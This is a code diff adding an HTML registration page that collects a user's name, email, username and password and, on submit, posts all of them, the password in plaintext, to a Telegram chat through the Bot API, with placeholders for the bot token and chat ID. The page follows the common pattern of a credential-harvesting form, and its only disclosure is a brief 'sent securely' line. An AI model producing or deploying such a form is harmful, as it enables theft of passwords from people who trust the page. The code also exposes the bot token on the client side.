@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Registration Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f3f4f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    .container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 6px;
+      color: #555;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+    .form-group input:focus {
+      border-color: #4f46e5;
+      outline: none;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      background: #4f46e5;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #3730a3;
+    }
+    .note {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #777;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Register</h2>
+    <form id="regForm">
+      <div class="form-group">
+        <label for="fullname">Full Name</label>
+        <input type="text" id="fullname" name="fullname" required>
+      </div>
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" required>
+      </div>
+      <div class="form-group">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <button type="submit">Register</button>
+    </form>
+    <p class="note">Data will be sent securely to our Telegram bot.</p>
+  </div>
+
+  <script>
+    document.getElementById("regForm").addEventListener("submit", function(e){
+      e.preventDefault();
+
+      // Replace with your Bot Token & Chat ID
+      const botToken = "YOUR_BOT_TOKEN_HERE";
+      const chatId = "YOUR_CHAT_ID_HERE";
+
+      const fullname = document.getElementById("fullname").value;
+      const email = document.getElementById("email").value;
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const message = `📝 New Registration:\n\n👤 Name: ${fullname}\n📧 Email: ${email}\n💻 Username: ${username}\n🔑 Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML"
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if(data.ok){
+          alert("✅ Registration sent to Telegram!");
+          document.getElementById("regForm").reset();
+        } else {
+          alert("❌ Error sending data.");
+        }
+      })
+      .catch(err => {
+        alert("⚠️ Network error.");
+        console.error(err);
+      });
+    });
+  </script>
+</body>
+</html>
